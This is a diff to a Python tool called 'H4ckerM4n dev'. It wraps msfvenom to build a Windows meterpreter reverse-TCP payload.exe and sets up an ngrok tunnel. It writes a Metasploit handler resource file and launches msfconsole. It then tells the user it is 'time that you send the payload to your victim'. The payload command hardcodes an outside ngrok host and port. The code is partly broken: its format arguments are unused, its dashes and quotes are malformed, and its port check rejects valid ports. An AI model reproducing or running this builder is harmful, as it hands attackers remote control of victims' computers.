@@ -3,10 +3,11 @@
 import os
 from time import sleep
 import webbrowser
+import random
 
 
 def banner():
-    print('''
+    a = '''\033[1;31;40m
                       :::!~!!!!!:.
                   .xUHWH!! !!?M88WHX:.
                 .X*#M@$!!  !X!M$$$$$$WWx:.
@@ -27,25 +28,43 @@ W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
 Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
 $R@i.~~ !     :   ~$$$$$B$$en:``
 ?MXT@Wx.~    :     ~"##*$$$$M~
-''')
+'''
+
+    b = """\033[1;37;40m
+     ___
+     \_/
+      |._
+      |'."-._.-""--.-"-.__.-'/
+      |  \       .-.        (
+      |   |     (@.@)        )
+      |   |   '=.|m|.='     /
+      |  /    .='`"``=.    /
+      |.'                 (
+      |.-"-.__.-""-.__.-"-.)
+      |
+      |
+      |
+"""
+
+    print(random.choice([a, b]))
 
     sleep(1)
 
-    print("----------H4ckerM4n dev---------")
+    print("\033[1;32;40m----------H4ckerM4n dev---------\033[0;37;40m")
     
     sleep(1)
 
 def main():
     os.system("clear")
     banner()
-    print("What kind of payload you want to create?")
+    print("\033[1;32;40mWhat kind of payload you want to create?")
     print("--If you want to use this by WAN you need a ngrok tcp port running--")
     print("""
     [1] Reverse Tcp
     [2] Ngrok Server
-    --Type the number inside the box--
+    --Type the number--
 """)
-    ask = input(">>")
+    ask = input("\033[0;37;40m>> ")
     if ask == "1":
         PayloadCreation()
     elif ask == "2":
@@ -55,7 +74,7 @@ def main():
 	    
 
 def NgrokHandler():
-    ask = input("Do you have ngrok installed? [y/n] \n>>").lower()
+    ask = input("Do you have ngrok installed? [y/n] \n>> ").lower()
     if ask == "n":
         os.system("clear")
         print("You need to install ngrok and set your auth key...")
@@ -63,10 +82,10 @@ def NgrokHandler():
         exit()
     elif ask == "y":
         try:
-            port = input("What port you want to use for ngrok? \n>>")
+            port = input("What port you want to use for ngrok? \n>> ")
             print("Dont close this terminal, to set up the payload open another tab...")
             sleep(5)
-            os.system("ngrok tcp {}".format(port)) # --- You can change the port if you want
+            os.system("ngrok tcp {}".format(port))
         except:
             print("There was an error trying to set up ngrok tcp port")
 
@@ -76,22 +95,41 @@ def PayloadCreation():
     ip = input("Enter LHOST ip: ")
     port = input("\nEnter PORT: ")	
     print("\nCreating payload...")	
-    os.system('msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -b “\\x00” -e x86/shikhata_ga_nai -f exe -o payload.exe'.format(ip, port))	
+    os.system('msfvenom -a x86 -platform windows -p windows/meterpreter/reverse_tcp LHOST=8.tcp.ngrok.io LPORT=15342 -b “\\x00” -e php/base64  -f exe -o payload.exe'.format(ip, port))	
     sleep(5)	
     os.system("clear")	
     banner()	
     print("Creating settings...")	
-    createPre(port)	
-    print("Everythings done!\nLaunching mfsconsole...")	
-    os.system("msfconsole -r DontDel.rc")
+    createRc()
+    
 
-def createPre(port):
+def createRc():
     try:
-        rc = "use exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST 0.0.0.0\nset LPORT {}\nrun".format(port)
+        try:
+            port = int(input("Set the PORT that you used for the ngrok server\n>> "))
         
+            if len(str(port)) >= 5:
+                os.system("clear")
+                print("Type a valid port")
+                createRc()
+        except ValueError:
+            print("You dont have to type strings")
+            createRc()
+        if (os.path.exists("DontDel.rc")):
+            os.remove("DontDel.rc")
+        rc = "use exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST 0.0.0.0\nset LPORT {}\nrun".format(port)
         f = open("DontDel.rc", "w")
         f.write(rc)
+        f.close()
+        sleep(1)
         print("Settings file succesfully created!")
+        sleep(1)
+        print("Everythings done!\nLaunching mfsconsole...")
+        os.system("clear")
+        banner()
+        print("--Now is the time that you send the payload to your victim--")
+        input("Press Enter after sending the payload")
+        os.system("msfconsole -r DontDel.rc")
     except:
         print("There was an error trying to create the requirements file")
 
